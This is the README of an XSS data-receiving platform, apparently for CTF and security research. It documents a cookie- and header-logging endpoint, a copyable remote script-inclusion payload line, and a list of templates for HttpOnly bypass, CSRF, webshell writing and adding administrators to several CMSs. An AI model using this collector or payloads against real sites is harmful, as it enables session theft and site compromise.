# BlueLotus XSS Receiver v4.0

基于 PHP Slim 4 + Vue 3 + SQLite 重构的 XSS 数据接收平台，适用于 CTF 竞赛和安全研究。

> **Warning: 本工具仅允许在 CTF 比赛等学习、研究场景中使用，严禁用于非法用途。**

> **完全不懂 XSS?** 请先阅读 [XSS 攻击新手完全指南](./XSS_BEGINNER_GUIDE.md)，从零开始学习什么是 XSS、如何使用本工具。

## 新版本亮点

- **后端**：PHP Slim 4 + SQLite，替代旧版无数据库文件存储，支持分页、搜索、排序
- **前端**：Vue 3 + Vite + TailwindCSS，替代 jQuery / jQWidgets / Bootstrap 3
- **认证**：JWT token + bcrypt 密码哈希，替代 MD5 三重哈希 + PHP Session
- **API**：RESTful 设计，前后端完全分离
- **脚本管理**：统一管理 JS 模板和自定义 JS，支持公开访问 `/js/{name}.js`
- **编码工具**：内置 12 种编码/解码功能（Base64、URL、Unicode、HTML、Hex 等）
- **旧数据迁移**：提供迁移脚本，一键导入旧版数据

---

## 快速开始

### 环境要求

- PHP >= 8.1（需要 pdo_sqlite 扩展）
- Node.js >= 18
- Composer

### 安装

```bash
# 1. 安装后端依赖
cd backend
composer install

# 2. 安装前端依赖
cd ../frontend
npm install
```

首次启动时，后端会自动初始化 SQLite 数据库并创建默认管理员账号。

### 开发环境

```bash
# 启动后端（端口 8080）
cd backend
php -S 0.0.0.0:8080 -t public

# 启动前端（端口 5173，自动代理 API 到 8080）
cd frontend
npm run dev
```

打开 http://localhost:5173 ，使用默认账号登录：

- 用户名：`admin`
- 密码：`bluelotus`

### 生产部署

```bash
# 构建前端
cd frontend
npm run build
```

#### Nginx 配置示例

```nginx
server {
    listen 80;
    server_name xss.example.com;

    # 前端静态文件
    location / {
        root /path/to/frontend/dist;
        try_files $uri $uri/ /index.html;
    }

    # API 和 XSS 接收端点
    location ~ ^/(api|r|js) {
        fastcgi_pass unix:/var/run/php-fpm.sock;
        fastcgi_param SCRIPT_FILENAME /path/to/backend/public/index.php;
        include fastcgi_params;
    }
}
```

---

## 从旧版本迁移

如果你有旧版本的数据（`/data/`、`/template/`、`/myjs/` 目录），可以一键迁移：

```bash
cd backend
php database/migrate.php
```

迁移脚本会自动：
- 读取并解密旧版 XSS 记录（支持 RC4/AES 加密）
- 导入 JS 模板和自定义 JS（包括描述信息）
- 创建默认管理员账号

> 迁移前请确保旧版 `config.php` 中的加密配置正确，否则无法解密数据。

---

## 配置说明

编辑 `backend/config/settings.php`：

```php
return [
    // 默认管理员（仅首次初始化时使用）
    'default_password' => 'bluelotus',
    'default_username' => 'admin',

    // JWT 密钥（生产环境务必修改）
    'jwt_secret' => 'YOUR_RANDOM_SECRET_HERE',
    'jwt_expiry' => 86400,  // token 有效期，默认 24 小时

    // IP 数据库路径（用于 IP 归属地查询）
    'qqwry_path' => __DIR__ . '/../../qqwry.dat',

    // 邮件通知（默认关闭）
    'mail' => [
        'enabled' => false,
        'smtp_host' => 'smtp.example.com',
        'smtp_port' => 465,
        'smtp_secure' => 'ssl',
        'username' => 'user@example.com',
        'password' => 'password',
        'from' => 'user@example.com',
        'to' => 'notify@example.com',
    ],

    // 安全设置
    'max_login_attempts' => 5,   // 最大登录失败次数
    'ban_duration' => 3600,      // IP 封禁时长（秒）
];
```

---

## 功能说明

### XSS 数据接收

向 `/r` 发送任意请求即可记录数据：

```
http://your-domain/r?keepsession=1&location=...&cookie=...
```

自动采集：
- GET / POST / Cookie 参数
- HTTP Headers（User-Agent、Referer 等）
- 客户端 IP 及归属地（基于纯真 IP 库）
- 自动检测并解码 Base64 编码的参数
- 响应 1x1 透明 GIF 图片（不影响目标页面）

### 记录管理

- 分页浏览，每页 25 条
- 全文搜索（IP、归属地、数据内容）
- 点击记录查看完整详情（Headers / GET / POST / Cookie）
- 自动刷新（每 5 秒轮询）
- 单条删除或一键清空

### JS 脚本管理

统一管理两种类型的脚本：
- **JS 模板**：公共 Payload 模板（默认模块、截图、xss 工具库等）
- **我的 JS**：自定义 Payload 脚本

功能：
- 在线代码编辑
- 代码格式化 / 压缩
- 一键复制 Payload URL：`<script src="http://domain/js/脚本名.js"></script>`
- 脚本通过 `/js/{name}.js` 公开访问（无需认证）

### 编码/解码工具

内置 12 种编码转换：

| 功能 | 说明 |
|------|------|
| Base64 编码/解码 | 标准 Base64 |
| URL 编码/解码 | encodeURIComponent |
| Unicode 编码/解码 | `\uXXXX` 格式 |
| HTML 实体编码/解码 | `&lt;` `&gt;` 等 |
| Hex 编码/解码 | `\xXX` 格式 |
| HTML 十进制编码 | `&#XX;` 格式 |
| HTML ↔ JS String | JSON 字符串转换 |

---

## API 参考

所有 API 返回 JSON 格式。认证接口需要在请求头中携带 JWT：

```
Authorization: Bearer <token>
```

### 认证

| 方法 | 路径 | 说明 | 认证 |
|------|------|------|------|
| POST | `/api/auth/login` | 登录 | 否 |
| POST | `/api/auth/logout` | 登出 | 是 |
| POST | `/api/auth/password` | 修改密码 | 是 |

**登录请求：**
```json
{ "username": "admin", "password": "bluelotus" }
```

**登录响应：**
```json
{ "token": "eyJ...", "username": "admin" }
```

### XSS 接收

| 方法 | 路径 | 说明 | 认证 |
|------|------|------|------|
| ANY | `/r` | 接收 XSS 数据 | 否 |

### 记录管理

| 方法 | 路径 | 说明 | 认证 |
|------|------|------|------|
| GET | `/api/records?page=1&limit=25&search=` | 记录列表 | 是 |
| GET | `/api/records/:id` | 记录详情 | 是 |
| DELETE | `/api/records/:id` | 删除记录 | 是 |
| DELETE | `/api/records` | 清空记录 | 是 |

### 脚本管理

| 方法 | 路径 | 说明 | 认证 |
|------|------|------|------|
| GET | `/api/scripts?type=myjs` | 脚本列表 | 是 |
| GET | `/api/scripts/:id` | 脚本详情 | 是 |
| POST | `/api/scripts` | 新建脚本 | 是 |
| PUT | `/api/scripts/:id` | 修改脚本 | 是 |
| DELETE | `/api/scripts/:id` | 删除脚本 | 是 |
| DELETE | `/api/scripts?type=myjs` | 清空某类型 | 是 |
| GET | `/js/{name}.js` | 公开访问脚本 | 否 |

---

## 项目结构

```
BlueLotus_XSSReceiver/
├── backend/                     # PHP 后端
│   ├── public/index.php         # Slim 4 入口
│   ├── config/settings.php      # 配置文件
│   ├── database/
│   │   ├── schema.sql           # SQLite 建表语句
│   │   └── migrate.php          # 旧数据迁移脚本
│   ├── src/
│   │   ├── Controller/          # 控制器
│   │   ├── Middleware/          # 中间件（Auth、CORS）
│   │   ├── Service/             # 服务层
│   │   └── routes.php           # 路由定义
│   └── storage/                 # SQLite 数据库文件
├── frontend/                    # Vue 3 前端
│   ├── src/
│   │   ├── views/               # 页面（Login、Dashboard）
│   │   ├── components/          # 组件
│   │   ├── stores/              # Pinia 状态管理
│   │   ├── api/                 # API 封装
│   │   └── router/              # 路由
│   └── dist/                    # 构建产物
├── template/                    # 旧版 JS 模板（迁移用）
├── myjs/                        # 旧版自定义 JS（迁移用）
├── data/                        # 旧版数据目录（迁移用）
└── qqwry.dat                    # 纯真 IP 数据库
```

---

## 内置 JS 模板

| 模板名称 | 说明 |
|----------|------|
| 默认模块 | 基础 XSS Payload，采集 location / cookie / opener |
| xss | XSS 工具库（jackmasa），提供 ajax / phish / xform 等函数 |
| 弹框测试 | `alert(1)` 测试 |
| 截图 | 使用 JS 对目标页面截图 |
| apache_httponly_bypass | Apache HttpOnly Cookie 绕过 |
| Discuz! CSRF | Discuz! 论坛 CSRF 利用模板 |
| dedecms一句话 | DedeCMS 后台写入一句话 |
| phpcms v9 通过模板getshell | PHPCMS v9 模板注入获取 Shell |
| 程氏舞曲CMSPHP3.0 | 程氏舞曲 CMS 利用模板 |
| 齐博cms加管理 | 齐博 CMS 添加管理员 |

---

## 致谢

- 原项目：[BlueLotus](https://github.com/firesunCN/BlueLotus_XSSReceiver) by firesun (清华大学蓝莲花战队)
- IP 数据库查询基于 Discuz X3.1
- 部分 JS 模板来自各安全研究者和 XSS 平台

## 许可

本项目仅供学习和安全研究使用。
